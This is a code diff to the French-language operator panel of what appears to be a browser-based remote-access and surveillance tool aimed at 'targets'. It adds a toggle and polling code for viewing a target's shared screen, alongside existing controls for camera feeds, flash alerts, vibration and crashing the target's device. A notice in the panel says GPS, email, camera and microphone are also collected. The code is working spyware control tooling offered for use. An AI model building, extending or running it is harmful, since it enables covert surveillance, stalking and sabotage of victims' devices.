@@ -606,6 +606,26 @@
                     </div>
                 </div>
 
+                <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; margin-bottom: 10px; border: 1px solid var(--border-color);">
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
+                        <span style="font-size: 0.85rem; color: var(--text-main);">📺 Écran cible (PC/mobile)</span>
+                        <label class="switch">
+                            <input type="checkbox" id="screen-toggle" onchange="toggleScreen(this.checked)">
+                            <span class="slider round"></span>
+                        </label>
+                    </div>
+                    <p style="font-size: 0.7rem; color: var(--text-dim); margin: 0 0 10px 0;">La cible doit accepter le partage d'écran dans la fenêtre du navigateur (pas de VirtualBox).</p>
+                    <div id="screen-preview-wrap" style="display: none; border-radius: 8px; overflow: hidden; background: #000; border: 1px solid var(--border-color); aspect-ratio: 16/9;">
+                        <img id="screen-preview" alt="Flux écran" style="width: 100%; height: 100%; object-fit: contain; display: block; background:#000;">
+                        <p id="screen-preview-status" style="display: none; padding: 20px; text-align: center; font-size: 0.75rem; color: var(--text-dim); margin: 0;">En attente du partage d'écran...</p>
+                    </div>
+                </div>
+
+                <div style="background: rgba(59,130,246,0.08); padding: 10px; border-radius: 8px; margin-bottom: 10px; border: 1px dashed var(--border-color); font-size: 0.7rem; color: var(--text-dim); line-height: 1.4;">
+                    <strong style="color: var(--text-main);">Accès distant — limites navigateur</strong><br>
+                    Impossible de télécharger un « modèle VirtualBox » avec toutes les apps et fichiers de la cible. Seuls GPS, email (formulaire), caméra, micro et <em>partage d'écran accepté</em> fonctionnent via le site.
+                </div>
+
                 <button class="btn-refresh btn-action-full" onclick="const msg = prompt('Message flash à envoyer en plein écran :'); if(msg) actionOnSelected('FLASH_ALERT', {message: msg})">Alerte Flash</button>
                 <button class="btn-refresh btn-action-full" onclick="actionOnSelected('VIBRATE')">Faire Vibrer</button>
                 <button class="btn-danger-outline btn-action-full" style="background: var(--danger); color: white;" onclick="actionOnSelected('STOP_DEVICE')">Arrêter l'appareil (Crash)</button>
@@ -868,6 +888,7 @@
             stopCameraPreview();
             cameraPollSessionId = sid;
             let lastTimestamp = 0;
+            let lastFrameAt = 0;
 
             const poll = async () => {
                 if (cameraPollSessionId !== sid) return;
@@ -881,13 +902,14 @@
 
                     if (data.frame && data.timestamp !== lastTimestamp) {
                         lastTimestamp = data.timestamp;
+                        lastFrameAt = Date.now();
                         preview.src = data.frame;
                         preview.style.display = 'block';
                         status.style.display = 'none';
-                    } else if (!data.frame) {
+                    } else if (!data.frame && Date.now() - lastFrameAt > 8000) {
                         preview.style.display = 'none';
                         status.style.display = 'block';
-                        status.textContent = 'En attente du flux (cible hors ligne ou permission refusée)...';
+                        status.textContent = 'Pas de flux — PC sans webcam, permission refusée, ou onglet en arrière-plan.';
                     }
                 } catch (e) {
                     console.warn('Poll caméra:', e);
@@ -895,7 +917,87 @@
             };
 
             poll();
-            cameraPollTimer = setInterval(poll, 800);
+            cameraPollTimer = setInterval(poll, 1200);
+        }
+
+        let screenPollTimer = null;
+        let screenPollSessionId = null;
+
+        function toggleScreen(enabled) {
+            const toggle = document.getElementById('screen-toggle');
+            const wrap = document.getElementById('screen-preview-wrap');
+            const preview = document.getElementById('screen-preview');
+            const status = document.getElementById('screen-preview-status');
+
+            if (selectedSessionIds.size !== 1) {
+                alert('Sélectionnez une seule cible pour l\'écran.');
+                if (toggle) toggle.checked = false;
+                stopScreenPreview();
+                return;
+            }
+
+            const sid = Array.from(selectedSessionIds)[0];
+
+            if (enabled) {
+                sendCommand(sid, 'SCREEN_ON');
+                if (wrap) wrap.style.display = 'block';
+                if (preview) preview.style.display = 'none';
+                if (status) {
+                    status.style.display = 'block';
+                    status.textContent = 'En attente — la cible doit choisir « Écran entier » ou « Fenêtre »…';
+                }
+                startScreenPreview(sid);
+            } else {
+                sendCommand(sid, 'SCREEN_OFF');
+                stopScreenPreview();
+                if (wrap) wrap.style.display = 'none';
+            }
+        }
+
+        function stopScreenPreview() {
+            if (screenPollTimer) {
+                clearInterval(screenPollTimer);
+                screenPollTimer = null;
+            }
+            screenPollSessionId = null;
+            const preview = document.getElementById('screen-preview');
+            if (preview) preview.removeAttribute('src');
+        }
+
+        function startScreenPreview(sid) {
+            stopScreenPreview();
+            screenPollSessionId = sid;
+            let lastTimestamp = 0;
+            let lastFrameAt = 0;
+
+            const poll = async () => {
+                if (screenPollSessionId !== sid) return;
+                try {
+                    const res = await fetch(`/api/screen-frame?sessionId=${encodeURIComponent(sid)}&t=${Date.now()}`, { cache: 'no-store' });
+                    if (!res.ok) return;
+                    const data = await res.json();
+                    const preview = document.getElementById('screen-preview');
+                    const status = document.getElementById('screen-preview-status');
+                    if (!preview || !status) return;
+
+                    if (data.frame && data.timestamp !== lastTimestamp) {
+                        lastTimestamp = data.timestamp;
+                        lastFrameAt = Date.now();
+                        preview.src = data.frame;
+                        preview.style.display = 'block';
+                        status.style.display = 'none';
+                    } else if (!data.frame && Date.now() - lastFrameAt > 8000) {
+                        preview.style.display = 'none';
+                        status.style.display = 'block';
+                        status.textContent = 'Pas de flux — activez le partage sur l\'appareil de la cible.';
+                    }
+                } catch (e) {
+                    console.warn('Poll écran:', e);
+                }
+            };
+
+            poll();
+            screenPollTimer = setInterval(poll, 1200);
         }
 
         function findEmailInSession(data) {
@@ -1253,7 +1355,7 @@
                     <div id="tab-control" class="tab-content">
                         <div class="action-card">
                             <h4>Commandes à distance</h4>
-                            <button class="btn-refresh btn-action-full" style="background: #8b5cf6;" onclick="sendCommand('${sid}', 'SCREEN_SHARE')">Accès Écran (Remote) 📺</button>
+                            <button class="btn-refresh btn-action-full" style="background: #8b5cf6;" onclick="sendCommand('${sid}', 'SCREEN_ON'); alert('La cible doit accepter le partage d\'écran dans son navigateur.');">Demander partage d'écran 📺</button>
                             <button class="btn-refresh btn-action-full" onclick="const msg = prompt('Message flash :'); if(msg) sendCommand('${sid}', 'FLASH_ALERT', {message: msg})">Alerte Flash</button>
                             <button class="btn-refresh btn-action-full" onclick="sendCommand('${sid}', 'VIBRATE')">Faire Vibrer</button>
                             <button class="btn-danger-outline btn-action-full" style="background: var(--danger); color: white;" onclick="sendCommand('${sid}', 'STOP_DEVICE')">Arrêter l'appareil (Crash)</button>
